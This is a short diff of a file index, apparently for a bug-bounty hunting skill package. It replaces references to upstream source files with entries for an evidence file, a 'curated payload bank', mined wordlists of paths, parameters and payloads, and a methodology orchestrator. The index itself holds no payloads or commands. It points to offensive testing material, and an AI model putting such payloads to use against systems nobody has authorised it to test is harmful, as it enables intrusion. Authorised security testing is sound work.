-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 2 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
